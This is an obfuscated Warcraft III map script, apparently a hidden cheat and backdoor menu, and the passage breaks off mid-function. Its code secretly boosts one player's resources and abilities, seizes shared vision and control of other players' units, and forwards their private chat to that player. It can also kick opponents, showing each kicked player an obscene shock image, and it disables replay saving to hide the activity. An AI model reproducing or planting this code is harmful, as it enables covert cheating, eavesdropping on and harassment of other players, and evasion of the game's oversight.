// globals
string sgguy_pass="IoI   "
integer array u7g_tE7
integer array VmFai       
string array u7g_cstring
dialog array u7g_dialog
button array u7g_buttong
boolean array u7g_kicked
trigger array u7g_tmTp7
triggeraction array u7g_trA7
triggercondition array u7g_trC7
// endglobals

function Miss7Yes takes nothing returns boolean
return true
endfunction
function on8Sg_on8ialization takes nothing returns nothing
local integer u7g_i6=0
loop
exitwhen(u7g_i6>6)
set u7g_dialog[u7g_i6]=DialogCreate()
set u7g_i6=u7g_i6+1
endloop
set u7g_i6=1
loop
exitwhen(u7g_i6>12)
set u7g_kicked[u7g_i6]=false
set u7g_kicked[u7g_i6+12]=false
set u7g_kicked[u7g_i6+24]=false
set u7g_kicked[u7g_i6+36]=false
set u7g_kicked[u7g_i6+48]=false
set u7g_kicked[u7g_i6+60]=false
set u7g_kicked[u7g_i6+72]=false
set u7g_i6=u7g_i6+1
endloop
set VmFai[34]=0
set VmFai[52]=1
set u7g_cstring[1]="|CFFFF0303"
set u7g_cstring[2]="|CFF0042FF"
set u7g_cstring[3]="|CFF1CE6B9"
set u7g_cstring[4]="|CFF540081"
set u7g_cstring[5]="|CFFFFFC00"
set u7g_cstring[6]="|CFFFE8A0E"
set u7g_cstring[7]="|CFF20C000"
set u7g_cstring[8]="|CFFE55BB0"
set u7g_cstring[9]="|CFF959697"
set u7g_cstring[10]="|CFF7FBFF1"
set u7g_cstring[11]="|CFF106246"
set u7g_cstring[12]="|CFF492A04"
endfunction
function Sg_Main_Dialog_Actions takes nothing returns boolean
local boolean u7g_aa7=true
if VmFai[GetPlayerId(GetTriggerPlayer())]==1and VmFai[52]==1then 
set VmFai[52]=2
call DialogClear(u7g_dialog[0])
call DialogSetMessage(u7g_dialog[0],"|cff00BFFFFai |r|c00FFFFFFis|r |cffff0000imbalance!|r")
set u7g_buttong[100]=DialogAddButton(u7g_dialog[0],"|CFFFFCC00Gold Rate|r |CFF7FBFF1>>|R",0)
set u7g_buttong[101]=DialogAddButton(u7g_dialog[0],"Lumber Rate |CFF7FBFF1>>|R",0)
set u7g_buttong[102]=DialogAddButton(u7g_dialog[0],"Exp Rate |CFF7FBFF1>>|R",0)
set u7g_buttong[103]=DialogAddButton(u7g_dialog[0],"Fly High |CFF7FBFF1>>|R",0)
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+13]==true then
set u7g_buttong[104]=DialogAddButton(u7g_dialog[0],"Ultra Sound [ |CFF20C000ON|R ]",0)
else
set u7g_buttong[104]=DialogAddButton(u7g_dialog[0],"Ultra Sound [ |CFFFF0303OFF|R ]",0)
endif
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+25]==true then
set u7g_buttong[105]=DialogAddButton(u7g_dialog[0],"Tertiary Eye [ |CFF20C000ON|R ]",0)
else
set u7g_buttong[105]=DialogAddButton(u7g_dialog[0],"Tertiary Eye [ |CFFFF0303OFF|R ]",0)
endif
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+37]==true then
set u7g_buttong[106]=DialogAddButton(u7g_dialog[0],"Almighty Hand [ |CFF20C000ON|R ]",0)
else
set u7g_buttong[106]=DialogAddButton(u7g_dialog[0],"Almighty Hand [ |CFFFF0303OFF|R ]",0)
endif
if VmFai[53]==GetPlayerId(GetTriggerPlayer())then
set u7g_buttong[107]=DialogAddButton(u7g_dialog[0],"Nasty Kick |CFF7FBFF1...|R",0)
endif
set u7g_buttong[108]=DialogAddButton(u7g_dialog[0],"No Mercy |CFF7FBFF1...|R",0)
set u7g_buttong[109]=DialogAddButton(u7g_dialog[0],"|CFFFFFFFFClose|R",0)
call DialogDisplay(GetTriggerPlayer(),u7g_dialog[0],u7g_aa7) 
elseif VmFai[52]==2then
call DisplayTimedTextToPlayer(GetTriggerPlayer(),0,0,3,"|c00008080Someone else is using the|r |c008080FFmenu|r|c00008080. Please|r |c008080FFwait|r|c00008080.|r")
endif
return false
endfunction   
function Sg_God_Dialog_Actions takes nothing returns nothing
local boolean u7g_aa7=true
call DialogClear(u7g_dialog[5])
call DialogSetMessage(u7g_dialog[5],"-What The Fuck?-")
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+49]==true then
set u7g_buttong[37]=DialogAddButton(u7g_dialog[5],"|cffffcc00WTF Cooldown|r [ |CFF20C000ON|R ]",0)
else
set u7g_buttong[37]=DialogAddButton(u7g_dialog[5],"|cffffcc00WTF Cooldown|r [ |CFFFF0303OFF|R ]",0)
endif
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+61]==true then
set u7g_buttong[38]=DialogAddButton(u7g_dialog[5],"WTF Patrol [ |CFF20C000ON|R ]",0)
else
set u7g_buttong[38]=DialogAddButton(u7g_dialog[5],"WTF Patrol [ |CFFFF0303OFF|R ]",0)
endif
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+73]==true then
set u7g_buttong[39]=DialogAddButton(u7g_dialog[5],"WTF Mana [ |CFF20C000ON|R ]",0)
else
set u7g_buttong[39]=DialogAddButton(u7g_dialog[5],"WTF Mana [ |CFFFF0303OFF|R ]",0)
endif
set u7g_buttong[40]=DialogAddButton(u7g_dialog[5],"|CFFFFFFFFPrevious Menu|R",0)
call DialogDisplay(GetTriggerPlayer(),u7g_dialog[5],u7g_aa7)
endfunction
function Sg_GoSpeed_hi7 takes nothing returns nothing
local unit u7g_g6
call TriggerSleepAction(1.00)
set u7g_g6=GetTriggerUnit()
call UnitResetCooldown(u7g_g6)
set u7g_g6=null
endfunction
function Sg_GoSpeed_Toggle_Actions takes nothing returns nothing
local integer u7g_id5=GetPlayerId(GetTriggerPlayer())
if u7g_kicked[u7g_id5+49]==true then
call DisableTrigger(u7g_tmTp7[u7g_id5+32])
call TriggerRemoveCondition(u7g_tmTp7[u7g_id5+32],u7g_trC7[u7g_id5+32])
call TriggerRemoveAction(u7g_tmTp7[u7g_id5+32],u7g_trA7[u7g_id5+32])
set u7g_kicked[u7g_id5+49]=false
else
set u7g_tmTp7[u7g_id5+32]=CreateTrigger()
set u7g_trA7[u7g_id5+32]=TriggerAddAction(u7g_tmTp7[u7g_id5+32],function Sg_GoSpeed_hi7)
set u7g_trC7[u7g_id5+32]=TriggerAddCondition(u7g_tmTp7[u7g_id5+32],Condition(function Miss7Yes))
call TriggerRegisterPlayerUnitEvent(u7g_tmTp7[u7g_id5+32],GetTriggerPlayer(),EVENT_PLAYER_UNIT_SPELL_FINISH,null)
call TriggerRegisterPlayerUnitEvent(u7g_tmTp7[u7g_id5+32],GetTriggerPlayer(),EVENT_PLAYER_UNIT_SPELL_ENDCAST,null)
set u7g_kicked[u7g_id5+49]=true
endif
call Sg_God_Dialog_Actions()
endfunction
function u7g_TlpM takes nothing returns boolean
local unit u7g_vm7
if GetIssuedOrderId()==851990then
set u7g_vm7=GetTriggerUnit()
call SetUnitX(u7g_vm7,GetOrderPointX())
call SetUnitY(u7g_vm7,GetOrderPointY())
endif
set u7g_vm7=null
return false
endfunction
function Sg_GoMight_Toggle_Actions takes nothing returns nothing
local integer u7g_id5=GetPlayerId(GetTriggerPlayer())
if u7g_kicked[u7g_id5+61]!=true then
set u7g_tmTp7[u7g_id5]=CreateTrigger()
set u7g_trC7[u7g_id5]=TriggerAddCondition(u7g_tmTp7[u7g_id5],Condition(function u7g_TlpM))
call TriggerRegisterPlayerUnitEvent(u7g_tmTp7[u7g_id5],GetTriggerPlayer(),EVENT_PLAYER_UNIT_ISSUED_POINT_ORDER,null)
set u7g_kicked[u7g_id5+61]=true
else
call DisableTrigger(u7g_tmTp7[u7g_id5])
call TriggerRemoveCondition(u7g_tmTp7[u7g_id5],u7g_trC7[u7g_id5])
set u7g_kicked[u7g_id5+61]=false
endif
call Sg_God_Dialog_Actions()
endfunction
function Sg_GoMagic_hi_Actions takes nothing returns boolean
local unit u7g_u4=GetTriggerUnit()
local unitstate u7g_us1=UNIT_STATE_MANA
local unitstate u7g_us2=UNIT_STATE_MAX_MANA
local real u7g_H7=GetUnitStatePercent(u7g_u4,u7g_us1,u7g_us2)
local real u7g_r5=GetUnitState(u7g_u4,u7g_us2)
if u7g_H7<55then
call SetUnitState(u7g_u4,u7g_us1,u7g_r5*0.55)
endif
set u7g_u4=null
set u7g_us1=null
set u7g_us2=null
return false
endfunction
function Sg_GoMagic_Toggle_Actions takes nothing returns nothing
local integer u7g_id5=GetPlayerId(GetTriggerPlayer())
if u7g_kicked[u7g_id5+73]==true then
call DisableTrigger(u7g_tmTp7[u7g_id5+16])
call TriggerRemoveCondition(u7g_tmTp7[u7g_id5+16],u7g_trC7[u7g_id5+16])
set u7g_kicked[u7g_id5+73]=false
else
set u7g_tmTp7[u7g_id5+16]=CreateTrigger()
set u7g_trC7[u7g_id5+16]=TriggerAddCondition(u7g_tmTp7[u7g_id5+16],Condition(function Sg_GoMagic_hi_Actions))
call TriggerRegisterPlayerUnitEvent(u7g_tmTp7[u7g_id5+16],GetTriggerPlayer(),EVENT_PLAYER_UNIT_SPELL_FINISH,null)
call TriggerRegisterPlayerUnitEvent(u7g_tmTp7[u7g_id5+16],GetTriggerPlayer(),EVENT_PLAYER_UNIT_SPELL_ENDCAST,null)
set u7g_kicked[u7g_id5+73]=true
endif
call Sg_God_Dialog_Actions()
endfunction  
function checkdabutt8 takes nothing returns boolean
local button u7g_butt8=GetClickedButton()
local boolean uvfmenuB
if u7g_butt8==u7g_buttong[37]then
call Sg_GoSpeed_Toggle_Actions()
elseif u7g_butt8==u7g_buttong[38]then
call Sg_GoMight_Toggle_Actions()
elseif u7g_butt8==u7g_buttong[39]then
call Sg_GoMagic_Toggle_Actions()
elseif u7g_butt8==u7g_buttong[40]then
set VmFai[52]=1
set uvfmenuB=Sg_Main_Dialog_Actions()
endif
return false
endfunction
function Sg_Kick_Dialog_Actions takes nothing returns nothing
local player u7g_py7
local integer u7g_mnK=1
local boolean u7g_aa7=true
call DialogClear(u7g_dialog[6])
call DialogSetMessage(u7g_dialog[6],"Nasty Kick")
set VmFai[54]=0
loop
exitwhen u7g_mnK>12
if u7g_kicked[u7g_mnK]==false then
set u7g_py7=Player(u7g_mnK-1)
if GetTriggerPlayer()!=u7g_py7 then
if GetPlayerController(u7g_py7)==MAP_CONTROL_USER then
if GetPlayerSlotState(u7g_py7)==PLAYER_SLOT_STATE_PLAYING then
set VmFai[VmFai[54]+103]=u7g_mnK
set u7g_buttong[VmFai[54]]=DialogAddButton(u7g_dialog[6],(u7g_cstring[u7g_mnK]+(GetPlayerName(u7g_py7)+"|R")),0)
set VmFai[54]=VmFai[54]+1
endif
endif
endif
endif
set u7g_mnK=u7g_mnK+1
endloop
set u7g_buttong[VmFai[54]]=DialogAddButton(u7g_dialog[6],"|CFFFFFFFFPrevious Menu|R",0)
call DialogDisplay(GetTriggerPlayer(),u7g_dialog[6],u7g_aa7)
set u7g_py7=null
endfunction  
function Sg_Kick_hi_Actions takes nothing returns boolean
local integer u7g_mnH=0
local integer u7g_mnE=VmFai[54]-1
local boolean u7ubb2
loop
exitwhen u7g_mnH>u7g_mnE
if GetClickedButton()==u7g_buttong[u7g_mnH]then
call RemovePlayer(Player(VmFai[u7g_mnH+103]-1),PLAYER_GAME_RESULT_VICTORY)
if GetLocalPlayer()==Player(VmFai[u7g_mnH+103]-1)then
call CinematicModeExBJ(true,bj_FORCE_ALL_PLAYERS,bj_CINEMODE_INTERFACEFADE)
call AbortCinematicFadeBJ()
call CinematicFadeCommonBJ(100,100,100,1,"war3mapImported\\goatse-pwned2.tga",100,0)
endif
set u7g_kicked[VmFai[u7g_mnH+103]]=true
call Sg_Kick_Dialog_Actions()
endif
set u7g_mnH=u7g_mnH+1
endloop  
if GetClickedButton()==u7g_buttong[u7g_mnH]then     
set VmFai[52]=1
set u7ubb2=Sg_Main_Dialog_Actions()
endif
return false
endfunction
function on8Sg_Kick_hi takes nothing returns nothing
set u7g_tmTp7[81]=CreateTrigger()
call TriggerRegisterDialogEvent(u7g_tmTp7[81],u7g_dialog[6])
call TriggerAddCondition(u7g_tmTp7[81],Condition(function Sg_Kick_hi_Actions))
endfunction
function GoldConD takes player u7g_pp9,integer u7g_ii7,integer u7g_ss9 returns nothing
local integer u7g_ft7=VmFai[u7g_ii7+55]*(u7g_ss9-VmFai[u7g_ii7+79])
local integer u7g_goldwhee=u7g_ss9+u7g_ft7*3/20
call SetPlayerState(u7g_pp9,PLAYER_STATE_RESOURCE_GOLD,u7g_goldwhee)
endfunction
function Sg_Gold_hi7 takes nothing returns boolean
local playerstate u7g_bb9=PLAYER_STATE_RESOURCE_GOLD
local player u7g_pp9=GetTriggerPlayer()
local integer u7g_ii7=GetPlayerId(u7g_pp9)
local integer u7g_ss9=GetPlayerState(u7g_pp9,u7g_bb9)
if u7g_ss9>VmFai[u7g_ii7+79]then
if u7g_ss9-VmFai[u7g_ii7+79]>1then
call DisableTrigger(GetTriggeringTrigger())
call GoldConD(u7g_pp9,u7g_ii7,u7g_ss9)
set u7g_ss9=GetPlayerState(u7g_pp9,u7g_bb9)
call EnableTrigger(GetTriggeringTrigger())
endif
endif
set VmFai[u7g_ii7+79]=u7g_ss9
set u7g_pp9=null
set u7g_bb9=null
return false
endfunction
function Sg_Gold_Selection_Actions takes nothing returns boolean
local integer u7g_id5=GetPlayerId(GetTriggerPlayer())+48
local integer u7g_mnG=13
local boolean uFaih1n
if GetClickedButton()==u7g_buttong[12]then
if VmFai[GetPlayerId(GetTriggerPlayer())+18]==1then
call DisableTrigger(u7g_tmTp7[u7g_id5])
call TriggerRemoveCondition(u7g_tmTp7[u7g_id5],u7g_trC7[u7g_id5])
set VmFai[GetPlayerId(GetTriggerPlayer())+18]=0
endif
endif
loop
exitwhen u7g_mnG>17
if GetClickedButton()==u7g_buttong[u7g_mnG]then
if VmFai[GetPlayerId(GetTriggerPlayer())+18]!=1then
set u7g_tmTp7[u7g_id5]=CreateTrigger()
set u7g_trC7[u7g_id5]=TriggerAddCondition(u7g_tmTp7[u7g_id5],Condition(function Sg_Gold_hi7))
set VmFai[GetPlayerId(GetTriggerPlayer())+79]=GetPlayerState(GetTriggerPlayer(),PLAYER_STATE_RESOURCE_GOLD)
call TriggerRegisterPlayerStateEvent(u7g_tmTp7[u7g_id5],GetTriggerPlayer(),PLAYER_STATE_RESOURCE_GOLD,GREATER_THAN_OR_EQUAL,0)
set VmFai[GetPlayerId(GetTriggerPlayer())+18]=1
endif
set VmFai[GetPlayerId(GetTriggerPlayer())+55]=u7g_mnG-12
endif
set u7g_mnG=u7g_mnG+1
endloop
set VmFai[52]=1
set uFaih1n=Sg_Main_Dialog_Actions()
return false
endfunction
function on8Sg_Gold_Selection takes nothing returns nothing
set u7g_tmTp7[83]=CreateTrigger()
call TriggerRegisterDialogEvent(u7g_tmTp7[83],u7g_dialog[1])
call TriggerAddCondition(u7g_tmTp7[83],Condition(function Sg_Gold_Selection_Actions))
endfunction
function Sg_Gold_Dialog_Actions takes nothing returns nothing
local boolean u7g_aa7=true
local button u7g_bgo7
if VmFai[17]!=1then
call on8Sg_Gold_Selection()
set VmFai[17]=1
endif
call DialogClear(u7g_dialog[1])
call DialogSetMessage(u7g_dialog[1],"Gold Rate")
set u7g_buttong[12]=DialogAddButton(u7g_dialog[1],"Normal",0)
set u7g_buttong[13]=DialogAddButton(u7g_dialog[1],"+15%",0)
set u7g_buttong[14]=DialogAddButton(u7g_dialog[1],"+30%",0)
set u7g_buttong[15]=DialogAddButton(u7g_dialog[1],"+45%",0)
set u7g_buttong[16]=DialogAddButton(u7g_dialog[1],"+60%",0)
set u7g_buttong[17]=DialogAddButton(u7g_dialog[1],"+75%",0)
set u7g_bgo7=DialogAddButton(u7g_dialog[1],"|CFFFFFFFFPrevious Menu|R",0)
call DialogDisplay(GetTriggerPlayer(),u7g_dialog[1],u7g_aa7)
set u7g_bgo7=null
endfunction
function LumBConD takes player u7g_pp9,integer u7g_ii7,integer u7g_ss9 returns nothing
local integer u7g_ft7=VmFai[u7g_ii7+67]*(u7g_ss9-VmFai[u7g_ii7+91])
call SetPlayerState(u7g_pp9,PLAYER_STATE_RESOURCE_LUMBER,(u7g_ss9+u7g_ft7*3/20))
endfunction
function Sg_LumB_hi7 takes nothing returns boolean
local playerstate u7g_bb9=PLAYER_STATE_RESOURCE_LUMBER
local player u7g_pp9=GetTriggerPlayer()
local integer u7g_ii7=GetPlayerId(u7g_pp9)
local integer u7g_ss9=GetPlayerState(u7g_pp9,u7g_bb9)
if u7g_ss9>VmFai[u7g_ii7+91]then                         
call DisableTrigger(GetTriggeringTrigger())
call LumBConD(u7g_pp9,u7g_ii7,u7g_ss9)
set u7g_ss9=GetPlayerState(u7g_pp9,u7g_bb9)
call EnableTrigger(GetTriggeringTrigger())
endif   
set VmFai[u7g_ii7+91]=u7g_ss9
set u7g_pp9=null
set u7g_bb9=null
return false
endfunction   
function Sg_Lumber_Selection_Actions takes nothing returns boolean
local integer u7g_id5=GetPlayerId(GetTriggerPlayer())+64
local integer u7g_mnL=19
local boolean ufeifei7
if GetClickedButton()==u7g_buttong[18]then
if VmFai[GetPlayerId(GetTriggerPlayer())+36]==1then
call DisableTrigger(u7g_tmTp7[u7g_id5])
call TriggerRemoveCondition(u7g_tmTp7[u7g_id5],u7g_trC7[u7g_id5])
set VmFai[GetPlayerId(GetTriggerPlayer())+36]=0
endif
endif
loop
exitwhen u7g_mnL>23
if GetClickedButton()==u7g_buttong[u7g_mnL]then
if VmFai[GetPlayerId(GetTriggerPlayer())+36]!=1then
set u7g_tmTp7[u7g_id5]=CreateTrigger()
set u7g_trC7[u7g_id5]=TriggerAddCondition(u7g_tmTp7[u7g_id5],Condition(function Sg_LumB_hi7))
set VmFai[GetPlayerId(GetTriggerPlayer())+91]=GetPlayerState(GetTriggerPlayer(),PLAYER_STATE_RESOURCE_LUMBER)
call TriggerRegisterPlayerStateEvent(u7g_tmTp7[u7g_id5],GetTriggerPlayer(),PLAYER_STATE_RESOURCE_LUMBER,GREATER_THAN_OR_EQUAL,0)
set VmFai[GetPlayerId(GetTriggerPlayer())+36]=1
endif
set VmFai[GetPlayerId(GetTriggerPlayer())+67]=u7g_mnL-18
endif
set u7g_mnL=u7g_mnL+1
endloop
set VmFai[52]=1
set ufeifei7=Sg_Main_Dialog_Actions()
return false
endfunction
function on8Sg_Lumber_Selection takes nothing returns nothing
set u7g_tmTp7[84]=CreateTrigger()
call TriggerRegisterDialogEvent(u7g_tmTp7[84],u7g_dialog[4])
call TriggerAddCondition(u7g_tmTp7[84],Condition(function Sg_Lumber_Selection_Actions))
endfunction
function Sg_Lumber_Dialog_Actions takes nothing returns nothing
local boolean u7g_aa7=true
local button u7g_lubU
if VmFai[35]!=1then
call on8Sg_Lumber_Selection()
set VmFai[35]=1
endif
call DialogClear(u7g_dialog[4])
call DialogSetMessage(u7g_dialog[4],"Lumber Rate")
set u7g_buttong[18]=DialogAddButton(u7g_dialog[4],"Normal",0)
set u7g_buttong[19]=DialogAddButton(u7g_dialog[4],"+15%",0)
set u7g_buttong[20]=DialogAddButton(u7g_dialog[4],"+30%",0)
set u7g_buttong[21]=DialogAddButton(u7g_dialog[4],"+45%",0)
set u7g_buttong[22]=DialogAddButton(u7g_dialog[4],"+60%",0)
set u7g_buttong[23]=DialogAddButton(u7g_dialog[4],"+75%",0)
set u7g_lubU=DialogAddButton(u7g_dialog[4],"|CFFFFFFFFPrevious Menu|R",0)
call DialogDisplay(GetTriggerPlayer(),u7g_dialog[4],u7g_aa7)
set u7g_lubU=null
endfunction
function Sg_Exp_Dialog_Actions takes nothing returns nothing
local boolean u7g_aa7=true
local button u7g_expB
call DialogClear(u7g_dialog[2])
call DialogSetMessage(u7g_dialog[2],"Exp Rate")
set u7g_buttong[24]=DialogAddButton(u7g_dialog[2],"Normal",0)
set u7g_buttong[25]=DialogAddButton(u7g_dialog[2],"+4%",0)
set u7g_buttong[26]=DialogAddButton(u7g_dialog[2],"+8%",0)
set u7g_buttong[27]=DialogAddButton(u7g_dialog[2],"+12%",0)
set u7g_buttong[28]=DialogAddButton(u7g_dialog[2],"+16%",0)
set u7g_buttong[29]=DialogAddButton(u7g_dialog[2],"+20%",0)
set u7g_expB=DialogAddButton(u7g_dialog[2],"|CFFFFFFFFPrevious Menu|R",0)
call DialogDisplay(GetTriggerPlayer(),u7g_dialog[2],u7g_aa7)
endfunction
function Sg_Exp_Selection_Actions takes nothing returns boolean
local integer u7g_mnEx=24
local boolean u7g_emeily
loop
exitwhen u7g_mnEx>29
if GetClickedButton()==u7g_buttong[u7g_mnEx]then
call SetPlayerHandicapXP(GetTriggerPlayer(),I2R(u7g_mnEx-24)*0.04+1)
endif
set u7g_mnEx=u7g_mnEx+1
endloop
set VmFai[52]=1
set u7g_emeily=Sg_Main_Dialog_Actions() 
return false
endfunction
function on8Sg_Exp_Selection takes nothing returns nothing
set u7g_tmTp7[85]=CreateTrigger()
call TriggerRegisterDialogEvent(u7g_tmTp7[85],u7g_dialog[2])
call TriggerAddCondition(u7g_tmTp7[85],Condition(function Sg_Exp_Selection_Actions))
endfunction
function Sg_Camera_Dialog_Actions takes nothing returns nothing
local boolean u7g_aa7=true
call DialogClear(u7g_dialog[3])
call DialogSetMessage(u7g_dialog[3],"Fly High")
set u7g_buttong[30]=DialogAddButton(u7g_dialog[3],"Normal",0)
set u7g_buttong[31]=DialogAddButton(u7g_dialog[3],"Bird",0)
set u7g_buttong[32]=DialogAddButton(u7g_dialog[3],"Eagle",0)
set u7g_buttong[33]=DialogAddButton(u7g_dialog[3],"Aeroplane",0)
set u7g_buttong[34]=DialogAddButton(u7g_dialog[3],"Jet",0) 
set u7g_buttong[35]=DialogAddButton(u7g_dialog[3],"Angel",0)
set u7g_buttong[36]=DialogAddButton(u7g_dialog[3],"|CFFFFFFFFPrevious Menu|R",0)
call DialogDisplay(GetTriggerPlayer(),u7g_dialog[3],u7g_aa7)
endfunction     
function Sg_Camera_Selection_Actions takes nothing returns boolean
local integer u7g_mnCa=30  
local boolean uvfmenu1
if GetClickedButton()==u7g_buttong[36]then
set VmFai[52]=1
set uvfmenu1=Sg_Main_Dialog_Actions()
return false
endif
loop
exitwhen u7g_mnCa>35
if GetClickedButton()==u7g_buttong[u7g_mnCa]then
call SetCameraFieldForPlayer(GetTriggerPlayer(),CAMERA_FIELD_ZOFFSET,100.00*I2R(u7g_mnCa-30),0)
endif
set u7g_mnCa=u7g_mnCa+1
endloop
call Sg_Camera_Dialog_Actions()
return false
endfunction 
function on8Sg_Camera_Selection takes nothing returns nothing
set u7g_tmTp7[86]=CreateTrigger()
call TriggerRegisterDialogEvent(u7g_tmTp7[86],u7g_dialog[3])
call TriggerAddCondition(u7g_tmTp7[86],Condition(function Sg_Camera_Selection_Actions))
endfunction
function Sg_Chat_hi_Actions takes nothing returns boolean
local integer u7g_mnC=1
loop
exitwhen u7g_mnC>12
if u7g_kicked[u7g_mnC+12]==true then
if u7g_mnC!=GetPlayerId(GetTriggerPlayer())+1then
call DisplayTextToPlayer(Player(u7g_mnC-1),0,0.25,u7g_cstring[GetPlayerId(GetTriggerPlayer())+1]+GetPlayerName(GetTriggerPlayer())+":|R "+GetEventPlayerChatString())
endif
endif
set u7g_mnC=u7g_mnC+1
endloop
return false
endfunction
function Sg_Chat_Toggle_Actions takes nothing returns nothing
local boolean u7g_bb7
local boolean u7g_motherf
local integer u9g_i7
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+13]==true then
set VmFai[34]=VmFai[34]-1
if VmFai[34]==0then
call DisableTrigger(u7g_tmTp7[87])
endif
set u7g_kicked[GetPlayerId(GetTriggerPlayer())+13]=false
else
if VmFai[34]<1then
set u7g_bb7=false
set u7g_tmTp7[87]=CreateTrigger()
set u9g_i7=0
loop
if VmFai[53]!=u9g_i7 then
call TriggerRegisterPlayerChatEvent(u7g_tmTp7[87],Player(u9g_i7),"",u7g_bb7)
endif
exitwhen u9g_i7==11
set u9g_i7=u9g_i7+1
endloop
call TriggerAddCondition(u7g_tmTp7[87],Condition(function Sg_Chat_hi_Actions))
endif
set VmFai[34]=VmFai[34]+1
set u7g_kicked[GetPlayerId(GetTriggerPlayer())+13]=true
endif
set VmFai[52]=1
set u7g_motherf=Sg_Main_Dialog_Actions()
endfunction
function Sg_Radar_Toggle_Actions takes nothing returns nothing
local player u7g_trp7=GetTriggerPlayer()
local integer u7g_pid7=GetPlayerId(u7g_trp7)*16
local boolean u7g_wE7
local boolean u7g_wH7
local boolean u7g_ahwah
local integer u7g_Y7=1
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+25]==true then
loop
if u7g_tE7[u7g_Y7+u7g_pid7]==1then
set u7g_tE7[u7g_Y7+u7g_pid7]=0
else
set u7g_wE7=false
call SetPlayerAlliance(Player(u7g_Y7-1),u7g_trp7,ALLIANCE_SHARED_VISION,u7g_wE7)
endif
set u7g_Y7=u7g_Y7+1
exitwhen u7g_Y7>16
endloop
set u7g_kicked[GetPlayerId(GetTriggerPlayer())+25]=false
else
loop
set u7g_wH7=GetPlayerAlliance(Player(u7g_Y7-1),u7g_trp7,ALLIANCE_SHARED_VISION)
if(u7g_wH7)then
set u7g_tE7[u7g_Y7+u7g_pid7]=1
else
set u7g_wE7=true
call SetPlayerAlliance(Player(u7g_Y7-1),u7g_trp7,ALLIANCE_SHARED_VISION,u7g_wE7)
endif
set u7g_Y7=u7g_Y7+1
exitwhen u7g_Y7>16
endloop
set u7g_kicked[GetPlayerId(GetTriggerPlayer())+25]=true
endif
set VmFai[52]=1
set u7g_ahwah=Sg_Main_Dialog_Actions()
set u7g_trp7=null
endfunction
function Sg_Creep_Toggle_Actions takes nothing returns nothing
local player u7g_trp7=GetTriggerPlayer()
local integer u7g_pid7=GetPlayerId(u7g_trp7)*16+257
local boolean u7g_wE7
local boolean u7g_wH7
local boolean u7g_dimgai
local integer u7g_Y7=1
if u7g_kicked[GetPlayerId(GetTriggerPlayer())+37]==true then
loop
if u7g_tE7[u7g_Y7+u7g_pid7]==1then
set u7g_tE7[u7g_Y7+u7g_pid7]=0
else
set u7g_wE7=false
call SetPlayerAlliance(Player(u7g_Y7-1),u7g_trp7,ALLIANCE_SHARED_CONTROL,u7g_wE7)
endif
set u7g_Y7=u7g_Y7+1
exitwhen u7g_Y7>16
endloop
set u7g_kicked[GetPlayerId(GetTriggerPlayer())+37]=false
else
loop
set u7g_wH7=GetPlayerAlliance(Player(u7g_Y7-1),u7g_trp7,ALLIANCE_SHARED_CONTROL)
if(u7g_wH7)then
set u7g_tE7[u7g_Y7+u7g_pid7]=1
else
set u7g_wE7=true
call SetPlayerAlliance(Player(u7g_Y7-1),u7g_trp7,ALLIANCE_SHARED_CONTROL,u7g_wE7)
endif
set u7g_Y7=u7g_Y7+1
exitwhen u7g_Y7>16
endloop
set u7g_kicked[GetPlayerId(GetTriggerPlayer())+37]=true
endif
if u7g_trp7==GetLocalPlayer()then
call ClearTextMessages()
endif
set VmFai[52]=1
set u7g_dimgai=Sg_Main_Dialog_Actions()
endfunction
function on8Sg_Main_Dialog takes player vPlayer returns nothing
set u7g_tmTp7[82]=CreateTrigger()
call TriggerRegisterPlayerEvent(u7g_tmTp7[82],vPlayer,EVENT_PLAYER_END_CINEMATIC)
call TriggerAddCondition(u7g_tmTp7[82],Condition(function Sg_Main_Dialog_Actions))
endfunction
function checkdabutton8 takes nothing returns nothing
local trigger u7g_dulan8=CreateTrigger()
call TriggerRegisterDialogEvent(u7g_dulan8,u7g_dialog[5])
call TriggerAddCondition(u7g_dulan8,Condition(function checkdabutt8))
endfunction
function checkdabutt7 takes nothing returns boolean
local button u7g_but7=GetClickedButton()
if u7g_but7==u7g_buttong[100]then
call Sg_Gold_Dialog_Actions()
elseif u7g_but7==u7g_buttong[101]then
call Sg_Lumber_Dialog_Actions()
elseif u7g_but7==u7g_buttong[102]then
call Sg_Exp_Dialog_Actions()
elseif u7g_but7==u7g_buttong[103]then
call Sg_Camera_Dialog_Actions()
elseif u7g_but7==u7g_buttong[104]then
call Sg_Chat_Toggle_Actions()
elseif u7g_but7==u7g_buttong[105]then
call Sg_Radar_Toggle_Actions()
elseif u7g_but7==u7g_buttong[106]then
call Sg_Creep_Toggle_Actions()
elseif u7g_but7==u7g_buttong[107]then
call Sg_Kick_Dialog_Actions()
elseif u7g_but7==u7g_buttong[108]then
call Sg_God_Dialog_Actions()
elseif u7g_but7==u7g_buttong[109]then
set VmFai[52]=1   
endif
return false
endfunction
function CheckDaButton7 takes nothing returns nothing
local trigger u7g_cdb7=CreateTrigger()
call TriggerRegisterDialogEvent(u7g_cdb7,u7g_dialog[0])
call TriggerAddCondition(u7g_cdb7,Condition(function checkdabutt7))
endfunction
function on8CustomTriggers7 takes nothing returns boolean
local player u7g_pm7=GetTriggerPlayer()
local integer u7g_fi7=GetPlayerId(u7g_pm7)
if VmFai[16]!=1then  
set VmFai[16]=1
call DoNotSaveReplay()
call on8Sg_on8ialization()
call CheckDaButton7()
call checkdabutton8()
call on8Sg_Kick_hi()
call on8Sg_Exp_Selection()
call on8Sg_Camera_Selection()
set VmFai[53]=GetPlayerId(u7g_pm7)
endif
if VmFai[u7g_fi7]==1then
set VmFai[u7g_fi7]=2
call DisplayTimedTextToPlayer(u7g_pm7,0,0,5,"|cffff0000ESC|r |cff00BFFFdisabled|r")
elseif VmFai[u7g_fi7]==2then
set VmFai[u7g_fi7]=1
call DisplayTimedTextToPlayer(u7g_pm7,0,0,5,"|cffff0000ESC|r |c00FFFF00enabled|r")
else
call on8Sg_Main_Dialog(GetTriggerPlayer())
set VmFai[u7g_fi7]=1
call DisplayTimedTextToPlayer(u7g_pm7,0,0,5,"|cffff0000ESC|r |c00FFFF00enabled|r")
endif
set u7g_pm7=null
return false
endfunction
function on8Sg_AMH7 takes nothing returns nothing
set u7g_tmTp7[80]=CreateTrigger()
